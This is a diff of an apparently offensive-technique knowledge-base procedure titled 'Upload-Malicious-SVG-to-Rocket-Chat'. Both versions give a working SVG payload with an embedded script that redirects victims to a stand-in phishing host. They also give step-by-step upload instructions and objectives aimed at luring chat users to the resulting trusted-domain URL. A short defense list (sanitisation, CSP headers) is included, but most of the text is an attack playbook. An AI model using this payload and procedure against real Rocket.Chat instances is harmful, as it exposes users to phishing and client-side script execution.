@@ -1,88 +1,93 @@
 ---
+id: proc-uuid-1
 tags:
-  - svg-upload
   - file-upload
+  - svg
+  - xss
   - rocket-chat
 type: procedure
 tools: []
 tactics:
   - '[[Initial Access]]'
 commands: []
+verified: false
 platforms:
   - Web
+submitted: true
+created_at: '2023-10-01T00:00:00Z'
 techniques:
-  - '[[Exploit Public-Facing Application]]'
+  - '[[JavaScript]]'
+updated_at: '2025-12-14T17:24:27.141Z'
 skill_level: intermediate
 impact_level: medium
 detection_risk: low
 sub_techniques: []
-id: a33a176a-4573-4991-b0b3-ec15443e674f
-created_at: '2025-12-14T05:32:10.324Z'
-updated_at: '2025-12-14T05:32:10.324Z'
-verified: false
 validated: true
-submitted: true
 mitre_tactics:
   - '[[Initial Access]]'
 mitre_techniques:
-  - '[[Exploit Public-Facing Application]]'
+  - '[[JavaScript]]'
 ---
 # Upload-Malicious-SVG-to-Rocket-Chat
 
 ## Summary
 
-This procedure involves crafting and uploading an SVG file embedded with JavaScript to a Rocket.Chat chat, exploiting the lack of sanitization to generate a preview URL that can later be used for malicious JS execution.
+This procedure involves crafting and uploading a malicious SVG file with embedded JavaScript to a Rocket.Chat chat room, exploiting the platform's lack of file sanitization to store and serve executable content.
 
 ## Description
 
-Rocket.Chat's file upload feature allows users to attach files to messages, automatically generating preview URLs for media types like SVG. Without proper sanitization, SVGs containing JavaScript (e.g., redirect scripts) are served inline from Google Cloud Storage under the Rocket.Chat domain. This procedure focuses on the upload step, preparing the payload for subsequent exploitation. The target environment is any accessible Rocket.Chat instance with file uploads enabled. Expected outcomes include a shareable URL that bypasses same-origin restrictions when accessed.
+Rocket.Chat's file upload feature allows users to attach files to messages, which are stored on external services like Google Cloud Storage but served through platform-specific URLs. SVG files can embed JavaScript that executes when rendered in a browser. By uploading such a file, attackers position a payload that can redirect users or perform other client-side actions upon access. This targets web-based Rocket.Chat instances running on Node.js, requiring only standard user access.
 
 ## Requirements
 
-1. Valid user account in Rocket.Chat
-2. Access to a chat room with file upload permissions
-3. Text editor to create the SVG payload
-4. Web browser for uploading
+1. Valid Rocket.Chat user account with upload permissions
+2. Text editor to create the SVG file
+3. Target chat room in the Rocket.Chat instance
+4. Knowledge of the victim's interaction patterns for effective sharing
 
 ## Defense
 
 Defensive measures and detection strategies:
 
-- Disable SVG uploads or sanitize files for script tags
-- Serve uploaded files with Content-Security-Policy (CSP) headers blocking inline JS
-- Monitor for unusual file uploads containing <script> tags
+- Sanitize SVG uploads by stripping or blocking JavaScript elements
+- Serve files with Content-Security-Policy (CSP) headers to prevent JS execution
+- Monitor file uploads for suspicious MIME types or content patterns
+- Educate users on avoiding untrusted file links in chats
 
 ## Objectives
 
-1. Upload unsanitized SVG with embedded JS
-2. Obtain preview URL for social engineering
-3. Set up for JS execution in victim browsers
+1. Deliver executable payload via legitimate file upload
+2. Obtain a shareable URL that bypasses external storage restrictions
+3. Set up for client-side exploitation on victim access
 
 ## Instructions
 
-### Step 1: Craft Malicious SVG
+### Step 1: Craft Malicious SVG Payload
 
-**Context**: Create an SVG file with JavaScript payload, such as a redirect to a phishing site.
+**Context**: Create an SVG file embedding JavaScript for the desired action, such as an open redirect.
 
-Open a text editor and write:
+Use a text editor to generate the file:
 
-```xml
-<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
-  <script>window.location.href = 'https://phishingsite.com';</script>
+```html
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>window.location.href = 'https://attacker-controlled-phishing-site.com';</script>
 </svg>
 ```
 
-Save as `malicious.svg`.
-
-> This embeds JS that executes on load, performing an open redirect.
+Save as `redirect.svg`. This script will execute onload when the SVG is rendered.
 
 ### Step 2: Upload to Rocket.Chat
 
-**Context**: Attach the file to a chat message to trigger URL generation.
+**Context**: Use the chat interface to upload the file, triggering storage and URL generation.
 
-Log into Rocket.Chat, navigate to a chat, click the attachment icon, and select `malicious.svg` to upload.
+1. Log in to Rocket.Chat.
+2. Open or create a chat room.
+3. Click the attachment icon and select `redirect.svg`.
+4. Send the message with the file.
 
-> Rocket.Chat processes the upload and generates a URL like `https://open.rocket.chat/file-upload/ID/malicious.svg`.
+The platform stores the file on storage.googleapis.com but provides a URL like `https://open.rocket.chat/file-upload/{ID}/redirect.svg`.
+
+**Expected Output**: File appears in chat with a clickable link.
 
 ## MITRE ATT&CK Mapping
 
@@ -92,7 +97,7 @@ Log into Rocket.Chat, navigate to a chat, click the attachment icon, and select 
 
 ### Techniques
 
-- [[Exploit Public-Facing Application]]
+- [[JavaScript]]
 
 ### Sub-Techniques
 
@@ -105,6 +110,7 @@ Log into Rocket.Chat, navigate to a chat, click the attachment icon, and select 
 
 ## Tags
 
-- [[svg-upload]]
 - [[file-upload]]
+- [[svg]]
+- [[xss]]
 - [[rocket-chat]]
